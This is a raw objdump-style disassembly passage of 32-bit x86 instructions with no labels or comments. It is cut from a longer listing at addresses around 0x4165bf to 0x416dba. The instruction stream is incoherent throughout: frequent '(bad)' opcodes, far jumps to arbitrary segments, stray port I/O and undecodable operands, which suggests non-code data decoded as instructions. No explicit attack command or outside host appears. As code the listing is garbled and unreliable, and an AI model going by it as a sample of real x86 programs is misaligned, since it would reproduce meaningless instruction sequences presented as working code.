  4165bf:	mov    ebp,0xe9351177
  4165c4:	pushf  
  4165c5:	sub    BYTE PTR [ecx-0x53],ch
  4165c8:	loopne 0x416570
  4165ca:	mov    eax,0xb2351f31
  4165cf:	loop   0x4165c6
  4165d1:	dec    edi
  4165d2:	sub    al,0x33
  4165d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d5:	stos   BYTE PTR es:[edi],al
  4165d6:	jno    0x41662a
  4165d8:	or     BYTE PTR [eax+ecx*8-0x4e],al
  4165dc:	lods   eax,DWORD PTR ds:[esi]
  4165dd:	out    dx,al
  4165de:	add    bh,BYTE PTR [edi-0xf3384d9]
  4165e4:	clc    
  4165e5:	pop    ebx
  4165e6:	jns    0x416629
  4165e8:	mov    ebp,DWORD PTR [ebx*4+0xae213a1]
  4165ef:	jg     0x416628
  4165f1:	leave  
  4165f2:	dec    edx
  4165f3:	leave  
  4165f4:	cmp    edx,ebp
  4165f6:	inc    esi
  4165f7:	sbb    BYTE PTR [edx],bh
  4165f9:	in     eax,0x67
  4165fb:	outs   dx,BYTE PTR ds:[esi]
  4165fc:	outs   dx,DWORD PTR ds:[esi]
  4165fd:	mov    al,ds:0x9ea29da8
  416602:	and    dl,BYTE PTR [ecx]
  416604:	xchg   ecx,eax
  416605:	push   esp
  416606:	or     al,0xbb
  416608:	sub    BYTE PTR [ecx],bh
  41660a:	jmp    0x10ee:0xc407fca8
  416611:	xchg   BYTE PTR [ebx],dh
  416613:	pusha  
  416614:	mov    eax,ds:0xb0e5b529
  416619:	sub    BYTE PTR [esi+0x75c24ed4],bl
  41661f:	out    0xe6,eax
  416621:	xor    cl,dl
  416623:	test   BYTE PTR [ebx+0x77e88b6e],ah
  416629:	aam    0x54
  41662b:	aaa    
  41662c:	pop    DWORD PTR [edi+0x63]
  41662f:	(bad)  
  416630:	mov    esi,0x20700277
  416635:	stos   DWORD PTR es:[edi],eax
  416636:	xor    bl,bl
  416638:	das    
  416639:	xor    dl,BYTE PTR [esi+0x31feeec2]
  41663f:	adc    eax,0x6e6f615b
  416644:	mov    edi,0x29bce01b
  416649:	dec    ecx
  41664a:	push   ds
  41664b:	ret    
  41664c:	imul   eax,ecx,0xab58af3a
  416652:	inc    edx
  416653:	jnp    0x4165d8
  416655:	push   ds
  416656:	push   esi
  416657:	pusha  
  416658:	(bad)  
  416659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41665a:	adc    eax,0x9a2f0313
  41665f:	or     eax,0xd2c1ebab
  416664:	or     al,0x6a
  416666:	mov    esi,0xc4d02677
  41666b:	jmp    0x8588:0xc85cb618
  416672:	addr16 sbb al,0x30
  416675:	pop    esp
  416676:	ins    DWORD PTR es:[edi],dx
  416677:	div    BYTE PTR [edx+0x3417b420]
  41667d:	cmp    DWORD PTR [edi-0x496e5f02],esp
  416683:	lock stc 
  416685:	jmp    0x41662a
  416687:	dec    esp
  416688:	inc    edi
  416689:	repnz sub eax,ebp
  41668c:	fsub   DWORD PTR [eax+0x8c3cb2a]
  416692:	add    DWORD PTR [ebx-0x7c583508],ecx
  416698:	gs mov esp,0x26b53065
  41669e:	and    eax,DWORD PTR [esi+eax*1+0x75]
  4166a2:	mov    ebp,0xa2a1c27
  4166a7:	xchg   ecx,eax
  4166a8:	inc    ebp
  4166a9:	bound  ecx,QWORD PTR [ebp-0x63]
  4166ac:	cmp    esi,ecx
  4166ae:	fstp   TBYTE PTR [ecx]
  4166b0:	nop
  4166b1:	lea    edx,[ebp+0x7f]
  4166b4:	lds    ebx,FWORD PTR [ebx]
  4166b6:	push   ds
  4166b7:	into   
  4166b8:	lds    eax,FWORD PTR [ebx]
  4166ba:	pushf  
  4166bb:	stos   DWORD PTR es:[edi],eax
  4166bc:	inc    edx
  4166bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166be:	lods   al,BYTE PTR ds:[esi]
  4166bf:	xchg   ebp,eax
  4166c0:	adc    al,0xc1
  4166c2:	(bad)  
  4166c3:	in     eax,0x43
  4166c5:	dec    ecx
  4166c6:	mov    esp,0x77426d68
  4166cb:	outs   dx,DWORD PTR ds:[esi]
  4166cc:	mov    esp,DWORD PTR [ebp*8-0x4f8a906a]
  4166d3:	cwde   
  4166d4:	sbb    ebp,DWORD PTR [edi+0x7cfcf2d6]
  4166da:	cmp    dh,BYTE PTR [edi]
  4166dc:	add    DWORD PTR [eax-0x5b],esp
  4166df:	inc    ecx
  4166e0:	scas   al,BYTE PTR es:[edi]
  4166e1:	fstp   DWORD PTR [eax]
  4166e3:	inc    ebx
  4166e4:	or     al,0x50
  4166e6:	cs retf 
  4166e8:	xor    edx,eax
  4166ea:	cmp    DWORD PTR [edx+0x6e],0xffffff8d
  4166ee:	jp     0x416702
  4166f0:	into   
  4166f1:	inc    esp
  4166f2:	call   0xe6c4cd25
  4166f7:	cmc    
  4166f8:	adc    BYTE PTR [esi+0x5],0x13
  4166fc:	sbb    ecx,DWORD PTR ds:0xb222aa98
  416702:	sbb    edx,0xbd5c673c
  416708:	loopne 0x4166cc
  41670a:	out    dx,eax
  41670b:	fdivr  DWORD PTR [ecx+ebx*8+0x34ce2e0]
  416712:	or     DWORD PTR [eax-0x7c9433ab],esp
  416718:	scas   al,BYTE PTR es:[edi]
  416719:	sub    esi,DWORD PTR [esi+ebx*8-0x55f891fd]
  416720:	cmp    ebx,ecx
  416722:	cmp    al,BYTE PTR [esi]
  416724:	fist   WORD PTR [ebx]
  416726:	add    DWORD PTR [ecx-0x41],ebp
  416729:	dec    esp
  41672a:	and    bl,bl
  41672c:	cmp    DWORD PTR [ebp-0x157a68b5],eax
  416732:	retf   0xcfe0
  416735:	cs mov bl,0x94
  416738:	aaa    
  416739:	adc    edx,DWORD PTR [ebp-0x59e37f95]
  41673f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416740:	cld    
  416741:	loop   0x4166ea
  416743:	in     eax,dx
  416744:	jb     0x41672d
  416746:	sbb    esi,DWORD PTR [ecx+0x208e3066]
  41674c:	or     DWORD PTR [edx],ebp
  41674e:	and    DWORD PTR [ecx],edx
  416750:	and    DWORD PTR [edi+edx*4+0x69],ecx
  416754:	das    
  416755:	adc    eax,0x963e64a
  41675a:	ror    BYTE PTR [edx+0x7641e672],cl
  416760:	sbb    bh,BYTE PTR [eax-0x18]
  416763:	push   0x19d1dd77
  416768:	nop
  416769:	test   cl,0x86
  41676c:	jle    0x1af29fac
  416772:	cdq    
  416773:	ficomp DWORD PTR [eax-0xf237df9]
  416779:	cwde   
  41677a:	aaa    
  41677b:	addr16 test eax,0xe98a7a0b
  416781:	call   0x9d52d1f1
  416786:	cdq    
  416787:	sbb    eax,0x60ea5ec1
  41678c:	addr16 pushf 
  41678e:	push   esp
  41678f:	mov    ebp,0x764b0a08
  416794:	ins    DWORD PTR es:[edi],dx
  416795:	jno    0x4167ab
  416797:	lods   al,BYTE PTR ds:[esi]
  416798:	pop    es
  416799:	push   ds
  41679a:	push   cs
  41679b:	int    0xe0
  41679d:	mov    eax,ebx
  41679f:	das    
  4167a0:	aam    0x3a
  4167a2:	sub    edx,edi
  4167a4:	push   0x7943dd58
  4167a9:	std    
  4167aa:	jg     0x41680b
  4167ac:	push   edi
  4167ad:	push   0xffffffea
  4167af:	mov    edx,0xf53093b4
  4167b4:	rcr    ah,cl
  4167b6:	leave  
  4167b7:	pop    ebp
  4167b8:	fcomp  st(3)
  4167ba:	mov    ecx,0xf1f78c91
  4167bf:	lods   eax,DWORD PTR ds:[esi]
  4167c0:	lock fcomp DWORD PTR [esp+eax*4-0xc]
  4167c5:	jae    0x41675f
  4167c7:	push   0xbe22cc25
  4167cc:	xchg   BYTE PTR [ebp+0x4da8194d],cl
  4167d2:	lahf   
  4167d3:	les    esi,FWORD PTR [edi-0x39]
  4167d6:	xor    ebx,DWORD PTR [ebp-0x6bea10b0]
  4167dc:	push   cs
  4167dd:	xchg   BYTE PTR [edx-0x69a5a812],ch
  4167e3:	mov    fs,WORD PTR [edi+0x56053881]
  4167e9:	aaa    
  4167ea:	test   ax,0xe913
  4167ee:	cdq    
  4167ef:	mov    ecx,0xd19e3b2a
  4167f4:	fnstenv [ecx]
  4167f6:	xchg   edi,eax
  4167f7:	or     ebx,esi
  4167f9:	mov    esi,0xdb428594
  4167fe:	mov    ebp,0xfb6ae9ed
  416803:	adc    bh,BYTE PTR [ebp-0x5d625ee0]
  416809:	cdq    
  41680a:	mov    dh,BYTE PTR [ecx-0x76]
  41680d:	cmp    DWORD PTR [esi-0x1fe9ea63],ebp
  416813:	fidivr DWORD PTR [eax+0x77]
  416816:	ins    BYTE PTR es:[edi],dx
  416817:	inc    esp
  416818:	add    DWORD PTR [edx],ebx
  41681a:	pop    ebx
  41681b:	ret    0xd28c
  41681e:	ds (bad) 
  416820:	ja     0x41686a
  416822:	lock fimul DWORD PTR [ebx]
  416825:	mov    ch,0x68
  416827:	sbb    ch,BYTE PTR [edi]
  416829:	xchg   edx,eax
  41682a:	cmp    BYTE PTR ds:0x52b8aea8,al
  416830:	(bad)  
  416831:	(bad)  
  416832:	jle    0x4168a7
  416834:	mov    ds:0xef58166f,eax
  416839:	and    DWORD PTR [ebx+0x4161886],0x62516d0e
  416843:	dec    esp
  416844:	pop    edi
  416845:	les    edx,FWORD PTR [esi-0x527766fe]
  41684b:	rcr    BYTE PTR [edi+edi*2],0x36
  41684f:	and    BYTE PTR [ebx-0x62476a20],0x74
  416856:	dec    eax
  416857:	mov    WORD PTR [eax+eiz*1],ss
  41685a:	ins    BYTE PTR es:[edi],dx
  41685b:	xor    bl,BYTE PTR [esi]
  41685d:	in     al,dx
  41685e:	and    al,0xca
  416860:	aam    0xa7
  416862:	xor    bh,BYTE PTR [edi+0x4a]
  416865:	stc    
  416866:	sbb    BYTE PTR [esi-0x3b],cl
  416869:	jbe    0x416868
  41686b:	dec    ebx
  41686c:	push   ss
  41686d:	sub    dh,BYTE PTR [ebx+edx*8-0x3c968e14]
  416874:	cdq    
  416875:	sub    ebx,ebp
  416877:	out    dx,eax
  416878:	xor    DWORD PTR [ecx-0x7c],ebx
  41687b:	(bad)  
  41687c:	xor    DWORD PTR [eax+0x69f0928d],eax
  416882:	retf   0xb532
  416885:	ins    BYTE PTR es:[edi],dx
  416886:	test   BYTE PTR [edi+edi*2-0x289b9c04],ch
  41688d:	(bad)  
  41688e:	dec    edi
  41688f:	xchg   ebp,eax
  416890:	jns    0x41688d
  416892:	inc    eax
  416893:	dec    esi
  416894:	or     al,0xf
  416896:	ja     0x4168ea
  416898:	mov    ebp,0x633457f1
  41689d:	sbb    DWORD PTR [eax-0x54],ecx
  4168a0:	xchg   ebp,eax
  4168a1:	aad    0xfd
  4168a3:	sbb    DWORD PTR [edx],0xffffffcd
  4168a6:	mov    BYTE PTR [edx-0x75fc3373],0x97
  4168ad:	jge    0x416846
  4168af:	jb     0x4168b9
  4168b1:	xchg   edi,ebp
  4168b3:	sub    BYTE PTR [esi+0x760709d7],bh
  4168b9:	cmp    BYTE PTR [ecx-0x7ea54ff8],bh
  4168bf:	in     eax,0x50
  4168c1:	pushf  
  4168c2:	test   al,0x72
  4168c4:	pop    edi
  4168c5:	sbb    BYTE PTR [esi*2-0x55f44ddc],0x8d
  4168cd:	add    edi,DWORD PTR [edx+eiz*1+0x2]
  4168d1:	inc    ebp
  4168d2:	push   esp
  4168d3:	jl     0x416891
  4168d5:	xor    edi,DWORD PTR [esi+eiz*2-0x50]
  4168d9:	test   al,0x78
  4168db:	xchg   BYTE PTR [ebx+0x2b],ah
  4168de:	mov    esi,0xb435f685
  4168e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168e4:	rcr    DWORD PTR [edx+edx*8-0x26],0xf6
  4168e9:	push   edi
  4168ea:	mov    WORD PTR [ebx+0x7a834e8],es
  4168f0:	lds    ebx,FWORD PTR [eax+0x344be03f]
  4168f6:	aad    0x31
  4168f8:	je     0x4168f5
  4168fa:	xor    DWORD PTR [ecx-0x1],ecx
  4168fd:	cmp    cl,dl
  4168ff:	fcomp  QWORD PTR [eax-0x3437fd2e]
  416905:	jns    0x41691b
  416907:	or     eax,0x1e98bdb4
  41690c:	cmp    al,0x92
  41690e:	cdq    
  41690f:	inc    ebp
  416910:	scas   al,BYTE PTR es:[edi]
  416911:	sbb    al,BYTE PTR [ecx+0x3a813c1c]
  416917:	jne    0x416952
  416919:	add    ch,BYTE PTR [ebp+0x44]
  41691c:	mov    esi,0xfe0743c0
  416921:	xor    eax,0xec4dacaa
  416926:	retf   
  416927:	sub    BYTE PTR [esi],0xb1
  41692a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41692b:	adc    eax,0xeebb1809
  416930:	sbb    al,0x62
  416932:	sti    
  416933:	push   ss
  416934:	xchg   ecx,eax
  416935:	mov    ebp,0xe3aaec16
  41693a:	mov    ecx,0x25855ab1
  41693f:	cld    
  416940:	aas    
  416941:	mov    ch,0xe3
  416943:	push   esp
  416944:	outs   dx,DWORD PTR ds:[esi]
  416945:	ret    
  416946:	or     bh,cl
  416948:	jnp    0x416916
  41694a:	mov    ds:0x87522bea,al
  41694f:	rol    dh,cl
  416951:	js     0x416935
  416953:	(bad)  
  416954:	iret   
  416955:	jle    0x4169b5
  416957:	dec    edx
  416958:	lock pop ebp
  41695a:	pop    esi
  41695b:	je     0x4169c5
  41695d:	test   al,0x96
  41695f:	fild   QWORD PTR [edi+0x53]
  416962:	mov    al,0xee
  416964:	js     0x41691c
  416966:	leave  
  416967:	addr16 push es
  416969:	xor    ebx,ebp
  41696b:	jecxz  0x41692e
  41696d:	mov    edi,0xea87cc0c
  416972:	push   ebp
  416973:	mov    DWORD PTR [ebx+0x1339f331],ecx
  416979:	jne    0x48cbf40f
  41697f:	xchg   DWORD PTR [ebp-0x149c62c],esi
  416985:	push   eax
  416986:	in     eax,dx
  416987:	dec    esi
  416988:	adc    eax,0xd57e5a8a
  41698d:	add    BYTE PTR [esi],bl
  41698f:	es jns 0x416963
  416992:	jecxz  0x41693c
  416994:	sar    BYTE PTR [eax],0x14
  416997:	popa   
  416998:	cmp    DWORD PTR [edi+ebx*1],edx
  41699b:	aas    
  41699c:	push   ebx
  41699d:	and    esi,DWORD PTR [edi]
  41699f:	stos   DWORD PTR es:[edi],eax
  4169a0:	pushf  
  4169a1:	xor    al,BYTE PTR fs:[ebp-0x16]
  4169a5:	out    0xc6,eax
  4169a7:	test   BYTE PTR [edx+0xf7c9daf],ah
  4169ad:	bound  esi,QWORD PTR [esi+0x58d7047a]
  4169b3:	ss xchg ebx,eax
  4169b5:	inc    ecx
  4169b6:	mov    al,0xf4
  4169b8:	(bad)  
  4169b9:	call   0x600d:0xf0ed37f7
  4169c0:	adc    ebx,ecx
  4169c2:	inc    eax
  4169c3:	arpl   WORD PTR [ebx+0xc4578ae],si
  4169c9:	jno    0x4169cb
  4169cb:	adc    eax,0x52db1c39
  4169d0:	inc    esi
  4169d1:	ins    BYTE PTR es:[edi],dx
  4169d2:	call   0xabd6:0xd322ec75
  4169d9:	(bad)  
  4169da:	fbstp  TBYTE PTR [edx]
  4169dc:	add    ah,BYTE PTR [ebx+0x1a3dd473]
  4169e2:	cmp    dh,bl
  4169e4:	leave  
  4169e5:	sbb    ecx,0x1872e847
  4169eb:	sub    DWORD PTR [ecx+0x54],eax
  4169ee:	mov    BYTE PTR [edi-0x1b],0x58
  4169f2:	daa    
  4169f3:	sbb    cl,bh
  4169f5:	jmp    ebp
  4169f7:	rol    BYTE PTR ds:0xe2439d98,0x7e
  4169fe:	adc    DWORD PTR [esp+eiz*8],0xffffffbb
  416a02:	repnz mov BYTE PTR [ecx+0x69],bh
  416a06:	xchg   ebp,eax
  416a07:	pop    ds
  416a08:	out    dx,eax
  416a09:	shl    BYTE PTR [ebp+0x4eb98354],cl
  416a0f:	push   cs
  416a10:	and    ebp,ebx
  416a12:	push   es
  416a13:	jmp    0x65af:0xb5683e79
  416a1a:	xor    eax,0x87df4b86
  416a1f:	and    eax,0xd8381925
  416a24:	push   ebp
  416a25:	iret   
  416a26:	sub    eax,0x5b7908b7
  416a2b:	cdq    
  416a2c:	sahf   
  416a2d:	jl     0x416a32
  416a2f:	mov    ecx,0xfed733f6
  416a34:	js     0x416a19
  416a36:	inc    ebp
  416a37:	scas   eax,DWORD PTR es:[edi]
  416a38:	sti    
  416a39:	arpl   WORD PTR cs:[eax+0x5c],sp
  416a3d:	out    0x1e,al
  416a3f:	mov    al,BYTE PTR [ebx-0x52985ea1]
  416a45:	mov    eax,0x69a59c89
  416a4a:	and    DWORD PTR [ebx+ecx*8],0xffffffdd
  416a4e:	xchg   esi,eax
  416a4f:	int3   
  416a50:	rcr    BYTE PTR [edx+eax*2+0x60],0xd3
  416a55:	test   al,0x5b
  416a57:	jg     0x416a4c
  416a59:	jb     0x416a30
  416a5b:	addr16 in eax,0x56
  416a5e:	push   0xf05dcd75
  416a63:	aam    0x36
  416a65:	(bad)  
  416a66:	shr    edi,1
  416a68:	mov    DWORD PTR [edi+0x21],ebp
  416a6b:	pop    esp
  416a6c:	xor    al,0x10
  416a6e:	hlt    
  416a6f:	scas   al,BYTE PTR es:[edi]
  416a70:	(bad)  
  416a72:	imul   DWORD PTR [edx-0x57]
  416a75:	pop    edi
  416a76:	fs loope 0x416ac8
  416a79:	xchg   edi,eax
  416a7a:	ja     0x416a72
  416a7c:	(bad)  
  416a7d:	mov    ds:0xdccdd653,eax
  416a82:	out    0xe6,al
  416a84:	into   
  416a85:	fxch   st(2)
  416a87:	and    DWORD PTR ds:0xcd0b65d2,esi
  416a8d:	cmp    dl,bl
  416a8f:	leave  
  416a90:	ja     0x416a2b
  416a92:	arpl   sp,bx
  416a94:	imul   eax,esi,0xffffffb2
  416a97:	xchg   ebp,eax
  416a98:	lods   eax,DWORD PTR ds:[esi]
  416a99:	jg     0x416a89
  416a9b:	test   ch,cl
  416a9d:	add    ch,bh
  416a9f:	loop   0x416a95
  416aa1:	imul   ecx,DWORD PTR [ebx-0x4a],0xffffffe7
  416aa5:	gs inc esi
  416aa7:	xchg   edx,eax
  416aa8:	mov    edx,0x9d8aba42
  416aad:	jae    0x416a6c
  416aaf:	pop    esp
  416ab0:	cmp    al,0x22
  416ab2:	sbb    BYTE PTR [ebp-0x1a00176e],bh
  416ab8:	xor    eax,0xbff05151
  416abd:	lea    esi,[ebp+edx*8+0x5ceaa470]
  416ac4:	adc    ch,BYTE PTR [ebp+0x7ea25d58]
  416aca:	sbb    eax,0xa2a8f9e1
  416acf:	mov    bh,0xb6
  416ad1:	iret   
  416ad2:	clc    
  416ad3:	pop    esi
  416ad4:	xchg   ecx,eax
  416ad5:	cli    
  416ad6:	fxch   st(6)
  416ad8:	sub    eax,0x138c782
  416add:	mov    al,0x2f
  416adf:	fidivr DWORD PTR [esi+0x37df42c3]
  416ae5:	dec    esp
  416ae6:	out    dx,eax
  416ae7:	jns    0x416b0e
  416ae9:	sub    BYTE PTR [ebx+edx*2+0x7ba266df],dh
  416af0:	loope  0x416aab
  416af2:	mov    ?,WORD PTR [edx-0x1]
  416af5:	ss call 0x6d2e:0x202530d9
  416afd:	jecxz  0x416b10
  416aff:	pop    edi
  416b00:	push   es
  416b01:	and    ebp,DWORD PTR [ebx]
  416b03:	test   eax,0x90a15485
  416b08:	push   0x43
  416b0a:	sbb    eax,0xa1d1d944
  416b0f:	aas    
  416b10:	adc    DWORD PTR [ebx+edi*4],ebp
  416b13:	imul   dh
  416b15:	jnp    0x35359f2f
  416b1b:	clc    
  416b1c:	iret   
  416b1d:	xlat   BYTE PTR ds:[ebx]
  416b1e:	adc    eax,0x496a173a
  416b23:	shr    BYTE PTR [eax],1
  416b25:	repz push ds
  416b27:	push   ebx
  416b28:	and    al,0x70
  416b2a:	int3   
  416b2b:	jle    0x416b46
  416b2d:	push   edx
  416b2e:	pop    ecx
  416b2f:	push   0xd1f791eb
  416b34:	push   esi
  416b35:	jp     0x416b5a
  416b37:	cmp    BYTE PTR [eax+0x5d],bl
  416b3a:	or     BYTE PTR [edi+0x14],0x47
  416b3e:	push   ecx
  416b3f:	sub    BYTE PTR [edx+0x6ef62e2f],0x47
  416b46:	addr16 pop ebp
  416b48:	ror    DWORD PTR [eax-0x1199a783],1
  416b4e:	or     ecx,DWORD PTR [edx-0x47]
  416b51:	push   es
  416b52:	retf   0xf591
  416b55:	je     0x416b88
  416b57:	jg     0x416baf
  416b59:	js     0x416b25
  416b5b:	inc    ebx
  416b5c:	xor    DWORD PTR [esi],0x842281a0
  416b62:	lea    edx,[edi]
  416b64:	inc    edx
  416b65:	push   ds
  416b66:	pusha  
  416b67:	pusha  
  416b68:	shr    eax,0xd5
  416b6b:	ficom  DWORD PTR [eax]
  416b6d:	cmp    al,al
  416b6f:	js     0x416af4
  416b71:	shl    DWORD PTR ds:0x124d95b2,cl
  416b77:	(bad)
  416b7b:	out    0x9f,eax
  416b7d:	mov    edi,0xf8d51fe1
  416b82:	add    DWORD PTR [esi+eiz*4],ecx
  416b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b86:	mov    cl,0x48
  416b88:	(bad)  
  416b8a:	sbb    al,0x92
  416b8c:	popa   
  416b8d:	or     eax,0x2354ddea
  416b92:	pop    ebx
  416b93:	addr16 and BYTE PTR [bp+si-0x27cf],dh
  416b99:	test   DWORD PTR [ebp+0x7a],0xfda0e06a
  416ba0:	fst    DWORD PTR [ecx-0x11]
  416ba3:	(bad)  
  416ba5:	pop    edx
  416ba6:	mov    BYTE PTR [edi-0x3a],dh
  416ba9:	dec    esi
  416baa:	sbb    ebx,DWORD PTR [ebp+0x6d]
  416bad:	mov    bh,0xec
  416baf:	mov    dl,0x91
  416bb1:	mov    esp,0xbae38220
  416bb6:	fisttp DWORD PTR [edi+0x66]
  416bb9:	lock mov esi,0x7290414
  416bbf:	xchg   edx,eax
  416bc0:	les    esi,FWORD PTR [esi+0x5f]
  416bc3:	mov    dh,0xde
  416bc5:	cld    
  416bc6:	outs   dx,BYTE PTR ds:[esi]
  416bc7:	jmp    0x416bd1
  416bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bca:	or     al,0x30
  416bcc:	mov    ecx,fs
  416bce:	sub    BYTE PTR [ebx-0x3e],cl
  416bd1:	jecxz  0x416ba2
  416bd3:	scas   eax,DWORD PTR es:[edi]
  416bd4:	xchg   BYTE PTR [esi],ah
  416bd6:	idiv   BYTE PTR [edx-0x13e3f906]
  416bdc:	nop
  416bdd:	xchg   ebp,eax
  416bde:	jo     0x416b99
  416be0:	jno    0x416b9a
  416be2:	daa    
  416be3:	xor    eax,0x4611d07c
  416be8:	sbb    BYTE PTR [esi],0x19
  416beb:	mov    ebx,0xdd833699
  416bf0:	inc    edx
  416bf1:	jmp    0xeb6c:0x632c424c
  416bf8:	jl     0x416c47
  416bfa:	cwde   
  416bfb:	fs stos BYTE PTR es:[edi],al
  416bfd:	test   al,cl
  416bff:	mov    dh,0x7f
  416c01:	je     0x416c52
  416c03:	in     al,dx
  416c04:	outs   dx,BYTE PTR ds:[esi]
  416c05:	ret    
  416c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c07:	add    bh,BYTE PTR [edx+0x258bb810]
  416c0d:	sub    dh,BYTE PTR [esi]
  416c0f:	mov    al,0xef
  416c11:	bound  ebx,QWORD PTR [edi+edi*1]
  416c14:	or     BYTE PTR [esi+0x5d925874],0xd0
  416c1b:	imul   esi,ecx,0x17
  416c1e:	mov    ebp,0xd5eabe13
  416c23:	jns    0x416c8b
  416c25:	mov    esp,ebx
  416c27:	mov    cs,WORD PTR [ecx-0x3be44b8f]
  416c2d:	int3   
  416c2e:	stos   BYTE PTR es:[edi],al
  416c2f:	adc    al,0xec
  416c31:	cmp    BYTE PTR [edx+0x14f87e76],dh
  416c37:	cmp    ebx,DWORD PTR [eax]
  416c39:	mov    al,ds:0xd08669ec
  416c3e:	or     BYTE PTR [esi+0x40],bl
  416c41:	lods   al,BYTE PTR ds:[esi]
  416c42:	pop    esp
  416c43:	int    0x25
  416c45:	mov    edx,edi
  416c47:	add    DWORD PTR [ebx-0x34],esp
  416c4a:	jbe    0x416be4
  416c4c:	mov    bl,0xee
  416c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c4f:	fdivr  DWORD PTR [ebp+eax*2-0x6b]
  416c53:	push   ss
  416c54:	test   bl,dh
  416c56:	je     0x416c8b
  416c58:	jmp    0xf112c28d
  416c5d:	lahf   
  416c5e:	xor    DWORD PTR [ebx-0x182e7194],0x76dca59d
  416c68:	xchg   ebx,eax
  416c69:	inc    eax
  416c6a:	sub    DWORD PTR ds:0x5e4fdd78,0x0
  416c71:	xchg   ebx,eax
  416c72:	or     edx,DWORD PTR [eax]
  416c74:	and    esi,0xed6b9f19
  416c7a:	sub    eax,0x46c9b087
  416c7f:	jno    0x416c82
  416c81:	das    
  416c82:	xor    eax,0x2c91c269
  416c87:	mov    ebp,0x5e5de3f3
  416c8c:	xchg   ebx,eax
  416c8d:	push   0xffffffd7
  416c8f:	rcr    DWORD PTR [esi],cl
  416c91:	adc    edi,DWORD PTR [edi+0x3]
  416c94:	imul   ebx,DWORD PTR [eax],0x829f16c3
  416c9a:	ror    BYTE PTR [ebp+0x59],cl
  416c9d:	mov    esp,0xbe59b7ea
  416ca2:	pop    es
  416ca3:	dec    esi
  416ca4:	repnz mov bh,0x2b
  416ca7:	or     bl,al
  416ca9:	cmc    
  416caa:	jbe    0x416ca2
  416cac:	push   es
  416cad:	call   0x8f7d:0x4a100f9f
  416cb4:	sti    
  416cb5:	sbb    DWORD PTR [ecx+0x4d],0x92f4db40
  416cbc:	jne    0x416ca8
  416cbe:	push   DWORD PTR [ebx-0x41]
  416cc1:	or     DWORD PTR [ebx-0x1289bd10],edx
  416cc7:	mov    esp,0x6fd6a798
  416ccc:	push   0xffffff88
  416cce:	add    dh,BYTE PTR [edi]
  416cd0:	sub    eax,0xfd56008b
  416cd5:	sbb    al,0xf6
  416cd7:	cdq    
  416cd8:	sbb    eax,0xcd0e53dc
  416cdd:	push   edx
  416cde:	cmp    DWORD PTR [esi+0x31],ebx
  416ce1:	adc    bh,BYTE PTR ds:0x3ea636a4
  416ce7:	ss je  0x416d00
  416cea:	bound  edi,QWORD PTR [edx]
  416cec:	adc    bl,bl
  416cee:	cmp    dh,BYTE PTR ds:0xcfd96c6e
  416cf4:	mov    ?,WORD PTR [ecx+0x77]
  416cf7:	(bad)  
  416cf8:	neg    BYTE PTR [ecx+0x1c]
  416cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cfc:	jge    0x416d6b
  416cfe:	fcom   st(7)
  416d00:	mov    dh,0xf5
  416d02:	mov    eax,0xe9f8c593
  416d07:	ja     0x416d83
  416d09:	std    
  416d0a:	scas   eax,DWORD PTR es:[edi]
  416d0b:	xchg   esp,eax
  416d0c:	fs jb  0x416cb1
  416d0f:	adc    dl,cl
  416d11:	imul   edi,DWORD PTR [ebp-0x6d2752f4],0x49
  416d18:	daa    
  416d19:	mov    ds:0xba158698,al
  416d1e:	imul   esi,DWORD PTR [eax+0x3a],0xffffffd9
  416d22:	dec    edx
  416d23:	xchg   esp,eax
  416d24:	or     BYTE PTR [edx+0x8],dl
  416d27:	inc    ecx
  416d28:	jbe    0x416d29
  416d2a:	retf   
  416d2b:	fsub   st,st(6)
  416d2d:	adc    BYTE PTR [esi-0x467959a],cl
  416d33:	repnz movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416d36:	fstp   QWORD PTR [ecx+ebx*2-0x6bce8aa7]
  416d3d:	sub    al,0x24
  416d3f:	test   DWORD PTR [esi],ebx
  416d41:	ror    BYTE PTR [ebx+0x30],cl
  416d44:	pop    esp
  416d45:	in     eax,dx
  416d46:	dec    esi
  416d47:	aaa    
  416d48:	loop   0x416dad
  416d4a:	sub    bh,0x48
  416d4d:	stos   DWORD PTR es:[edi],eax
  416d4e:	mov    bh,0x38
  416d50:	mov    ecx,0x5558a417
  416d55:	mov    ds:0xfa63a827,al
  416d5a:	idiv   BYTE PTR [eax+0x3e]
  416d5d:	mov    al,ds:0x62c0f7fd
  416d62:	imul   ecx,DWORD PTR [edx-0x57],0x56
  416d66:	lods   eax,DWORD PTR ds:[esi]
  416d67:	xor    eax,0x539b089a
  416d6c:	mov    dl,0xf2
  416d6e:	test   al,0x18
  416d70:	jbe    0x416d64
  416d72:	and    al,0xeb
  416d74:	and    eax,0x7f59c483
  416d79:	fild   WORD PTR gs:[edi-0xc]
  416d7d:	jmp    0x335d:0xce96b8f4
  416d84:	dec    eax
  416d85:	xchg   ebp,eax
  416d86:	scas   al,BYTE PTR es:[edi]
  416d87:	mov    bh,BYTE PTR [esi]
  416d89:	in     eax,dx
  416d8a:	int3   
  416d8b:	into   
  416d8c:	data16 jnp 0x416e01
  416d8f:	out    0xdd,al
  416d91:	mov    esp,DWORD PTR [ecx-0x4a51b6f9]
  416d97:	rcr    BYTE PTR [ecx-0x1f],0x69
  416d9b:	push   esi
  416d9c:	mov    dh,0xe1
  416d9e:	push   cs
  416d9f:	out    0xff,al
  416da1:	xor    al,0x5e
  416da3:	(bad)  
  416da4:	sbb    al,0x22
  416da6:	push   cs
  416da7:	jge    0x416ddb
  416da9:	in     eax,0x4a
  416dab:	sub    DWORD PTR [edi+edx*2+0x50d3a4a3],edx
  416db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416db3:	retf   
  416db4:	hlt    
  416db5:	cmp    al,0xe7
  416db7:	ins    DWORD PTR es:[edi],dx
  416db8:	xchg   ecx,eax
  416db9:	(bad)  
  416dba:	mov    al,ds:0xf4cdaefa
